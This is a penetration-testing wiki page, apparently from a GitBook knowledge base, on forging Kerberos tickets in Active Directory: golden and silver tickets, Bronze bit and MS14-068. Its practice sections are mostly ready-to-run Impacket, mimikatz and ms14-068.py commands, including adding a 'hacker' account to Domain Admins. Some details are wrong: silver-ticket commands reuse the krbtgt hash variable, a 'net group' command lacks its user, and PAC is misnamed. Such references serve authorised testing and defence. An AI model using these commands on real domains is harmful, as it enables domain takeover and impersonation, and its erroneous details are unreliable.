---
description: MITRE ATT&CK™ Sub-techniques T1558.001 and T1558.002
---

# Forged tickets

## Theory

Silver and Golden tickets are forged Kerberos tickets that can be used with [pass-the-ticket](ptt.md) to access services in an Active Directory domain.

* **Golden ticket**: The NT hash (when the RC4 etype is not disabled, or any other Kerberos DES or AES key when it is) of the special account `krbtgt` can be used to forge a special TGT (Ticket Granting Ticket) that can later be used with [Pass-the-ticket](ptt.md) to access any resource within the AD domain. In practice, the `krbtgt`'s key is used to encrypt, among other things, the PAC (Privilege Authentication Certificate), a special set of information about the requesting user that the KDC (Key Distribution Center) will copy/paste in the ST the users requests.
* **Silver ticket**: The NT hash (when the RC4 etype is not disabled, or any other Kerberos DES or AES key when it is) of a service account can be used to forge a Service ticket that can later be used with [Pass-the-ticket](ptt.md) to access that service. In practice, the key is used to encrypt, among other things, the PAC (Privilege Authentication Certificate), a special set of information about the requesting user that the target service will decrypt and read to decide if the user can have access.

The **Bronze bit** vulnerability (CVE-2020-17049) introduced the possibility of forwarding service tickets when it shouldn't normally be possible (protected users, unconstrained delegation, constrained delegation configured with protocol transition).

![](../../../.gitbook/assets/Kerberos\_delegation.png)

## Practice

The following parts allow to obtain modified or crafted Kerberos tickets. Once obtained, these tickets can be used with [Pass-the-Ticket](ptt.md).

{% hint style="success" %}
For Golden and Silver tickets, it's important to remember that, by default, [ticketer](https://github.com/SecureAuthCorp/impacket/blob/a16198c3312d8cfe25b329907b16463ea3143519/examples/ticketer.py#L740-L741) and [mimikatz](https://github.com/gentilkiwi/mimikatz/wiki/module-\~-kerberos) forge tickets containing PACs that say the user belongs to some well-known administrators groups (i.e. group ids 513, 512, 520, 518, 519). There are scenarios where these groups are not enough (special machines where even Domain Admins don't have local admin rights).&#x20;

In these situations, testers can either look for the domain groups that have local administrator privileges on the target machine, or specify all the groups ids when creating the ticket.

_**Nota bene**: Deny ACEs could actually prevent the second solution from working. Encountering a Deny ACE preventing domain admins to log on could be an issue when having all groups ids in the ticket, including the domain admin group id._
{% endhint %}

{% hint style="info" %}
When forging tickets, only the user-id and groups-ids are useful. The username supplied is mostly useless.
{% endhint %}

### Golden ticket

In order to craft a golden ticket, testers need to find the `krbtgt`'s NT hash or AES key (128 or 256 bits). In most cases, this can only be achieved with domain admin privileges through a [DCSync attack](../credentials/dumping/dcsync.md). Because of this, golden tickets only allow lateral movement and not privilege escalation.

{% hint style="info" %}
Microsoft now uses AES 256 bits by default. Using this encryption algorithm (instead of giving the NThash) will be stealthier.
{% endhint %}

{% tabs %}
{% tab title="UNIX-like" %}
There are [Impacket](https://github.com/SecureAuthCorp/impacket) scripts for each step of a golden ticket creation : retrieving the `krbtgt`, retrieving the domain SID, creating the golden ticket.

```bash
# Find the domain SID
lookupsid.py -hashes 'LMhash:NThash' 'DOMAIN/DomainUser@DomainController' 0

# Create the golden ticket (with an RC4 key, i.e. NT hash)
ticketer.py -nthash $krbtgtNThash -domain-sid $domainSID -domain $DOMAIN randomuser

# Create the golden ticket (with an AES 128/256bits key)
ticketer.py -aesKey $krbtgtAESkey -domain-sid $domainSID -domain $DOMAIN randomuser

# Create the golden ticket (with an RC4 key, i.e. NT hash) with custom user/groups ids
ticketer.py -nthash $krbtgtNThash -domain-sid $domainSID -domain $DOMAIN -user-id $USERID -groups $GROUPID1,$GROUPID2,... randomuser
```
{% endtab %}

{% tab title="Windows" %}
On Windows, [mimikatz](https://github.com/gentilkiwi/mimikatz) (C) can be used for this attack.

```bash
# with an NT hash
kerberos::golden /domain:$DOMAIN /sid:$DomainSID /rc4:$krbtgt_NThash /user:randomuser /ptt

# with an AES 128 key
kerberos::golden /domain:$DOMAIN /sid:$DomainSID /aes128:$krbtgt_aes128_key /user:randomuser /ptt

# with an AES 256 key
kerberos::golden /domain:$DOMAIN /sid:$DomainSID /aes256:$krbtgt_aes256_key /user:randomuser /ptt
```

For both mimikatz and Rubeus, the `/ptt` flag is used to automatically [inject the ticket](ptt.md#injecting-the-ticket).
{% endtab %}
{% endtabs %}

### Silver ticket

In order to craft a silver ticket, testers need to find the target service account's NT hash or AES key (128 or 256 bits).

_"While the scope is more limited than Golden Tickets, the required hash is easier to get and there is no communication with a DC when using them, so detection is more difficult than Golden Tickets." (_[_adsecurity.org_](https://adsecurity.org/?p=2011)_)_

{% tabs %}
{% tab title="UNIX-like" %}
The [Impacket](https://github.com/SecureAuthCorp/impacket) script [ticketer](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py) can create silver tickets.

```bash
# Find the domain SID
lookupsid.py -hashes 'LMhash:NThash' 'DOMAIN/DomainUser@DomainController' 0

# with an NT hash
python ticketer.py -nthash $NThash -domain-sid $DomainSID -domain $DOMAIN -spn $SPN $Username

# with an AES (128 or 256 bits) key
python ticketer.py -aesKey $AESkey -domain-sid $DomainSID -domain $DOMAIN -spn $SPN $Username
```

The SPN (ServicePrincipalName) set will have an impact on what services will be reachable. For instance, `cifs/target.domain` or `host/target.domain` will allow most remote dumping operations (more info on [adsecurity.org](https://adsecurity.org/?page\_id=183)).
{% endtab %}

{% tab title="Windows" %}
On Windows, [mimikatz](https://github.com/gentilkiwi/mimikatz) can be used to generate a silver ticket. Testers need to carefully choose the right SPN type (cifs, http, ldap, host, rpcss) depending on the wanted usage.

```bash
# with an NT hash
kerberos::golden /domain:$DOMAIN /sid:$DomainSID /rc4:$krbtgt_NThash /user:$username_to_impersonate /target:$targetFQDN /service:$spn_type /ptt

# with an AES 128 key
kerberos::golden /domain:$DOMAIN /sid:$DomainSID /aes128:$krbtgt_aes128_key /user:$username_to_impersonate /target:$targetFQDN /service:$spn_type /ptt

# with an AES 256 key
kerberos::golden /domain:$DOMAIN /sid:$DomainSID /aes256:$krbtgt_aes256_key /user:$username_to_impersonate /target:$targetFQDN /service:$spn_type /ptt
```

For both mimikatz and Rubeus, the `/ptt` flag is used to automatically [inject the ticket](ptt.md#injecting-the-ticket).
{% endtab %}
{% endtabs %}

### Bronze bit (CVE-2020-17049)

{% hint style="warning" %}
In order to exploit this vulnerability, attackers need to find a service able to delegate to another service (see [Kerberos delegations](delegations/)), and they need that first service account Kerberos key (NT hash or AES key, 128 or 256 bits).
{% endhint %}

For example with [constrained delegation](delegations/#constrained-delegations) set between a controlled service and a target one with protocol transition enabled and the target user being protected, the [Impacket](https://github.com/SecureAuthCorp/impacket) script [getST](https://github.com/SecureAuthCorp/impacket/blob/master/examples/getST.py) (Python) can perform all the necessary steps to obtain the final "impersonating" ST (in this case, "Administrator" is impersonated/delegated account but it can be any user in the environment).

The input credentials are those of the compromised service account configured with constrained delegations.

```bash
# with an NT hash
getST.py -force-forwardable -spn $Target_SPN -impersonate Administrator -dc-ip $Domain_controller -hashes :$Controlled_service_NThash $Domain/$Controlled_service_account

# with an AES (128 or 256 bits) key
getST.py -force-forwardable -spn $Target_SPN -impersonate Administrator -dc-ip $Domain_controller -aesKey $Controlled_service_AES_key $Domain/$Controlled_service_account
```

The SPN (ServicePrincipalName) set will have an impact on what services will be reachable. For instance, `cifs/target.domain` or `host/target.domain` will allow most remote dumping operations (more info on [adsecurity.org](https://adsecurity.org/?page\_id=183)).

### MS14-068 (CVE-2014-6324)

This vulnerability allows attackers to forge a TGT with unlimited power (i.e. with a modified PAC stating the user is a member of privileged groups). This attack is similar to the [golden ticket](forged-tickets.md#golden-ticket), however, it doesn't require the attacker to know the `krbtgt`. This attack is a really powerful privilege escalation technique. However, it will not work on patched domain controllers.

{% tabs %}
{% tab title="pykek" %}
This attack can be operated with [pykek](https://github.com/mubix/pykek)'s [ms14-068](https://github.com/mubix/pykek/blob/master/ms14-068.py) Python script. The script can carry out the attack with a cleartext password or with [pass-the-hash](../ntlm/pth.md).

Referring to [kekeo](https://github.com/gentilkiwi/kekeo/wiki/ms14068)'s wiki might also help untangle some situations but errors like  `KDC_ERR_SUMTYPE_NOSUPP (15)` or `KRB_ERR_GENERIC (60) `when trying to use the generated `.ccache` ticket mean the target is patched.

In order to operate the attack, knowing a domain account’s name, it’s password and it’s SID are needed.&#x20;

A TGT can then be obtained with one of the following commands.

```bash
# with a plaintext password
ms14-068.py -u 'USER'@'DOMAIN_FQDN' -p 'PASSWORD' -s 'USER_SID' -d 'DOMAIN_CONTROLLER'

# with pass-the-hash
ms14-068.py -u 'USER'@'DOMAIN_FQDN' --rc4 'NThash' -s 'USER_SID' -d 'DOMAIN_CONTROLLER'
```

Once the `.ccache` TGT is obtained, if the attack is successful, the ticket will be usable with [pass-the-ticket](ptt.md). An easy way to check if the TGT works is to use it and ask for a service ticket. This can be done with Impacket's [getST.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/getST.py) (Python).

```bash
getST.py -k -no-pass -spn 'any_valid_spn' $DOMAIN_FQDN/$USER
```

{% hint style="warning" %}
In some scenarios, I personally have had trouble using the `.ccache` ticket on UNIX-like systems. What I did was [convert it](ptt.md#practice) to `.kirbi`, switch to a Windows system, inject the ticket with mimikatz's `kerberos:ptt` command, and then create a new user and add it to the domain admins group.

```bash
net user "hacker" "132Pentest!!!" /domain /add
net group "Domain Admins" /domain /add
```
{% endhint %}

Metasploit Framework can also be useful in the sense that it prints valuable error information.

```bash
msf6 > use admin/kerberos/ms14_068_kerberos_checksum
```
{% endtab %}

{% tab title="🛠️ Windows" %}
kekeo
{% endtab %}
{% endtabs %}

## References

{% embed url="https://en.hackndo.com/kerberos-silver-golden-tickets/" %}

{% embed url="https://adsecurity.org/?p=2011" %}

{% embed url="https://adsecurity.org/?p=483" %}

{% embed url="https://en.hackndo.com/kerberos" %}

{% embed url="https://blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-overview/" %}

{% embed url="https://labs.f-secure.com/archive/digging-into-ms14-068-exploitation-and-defence/" %}

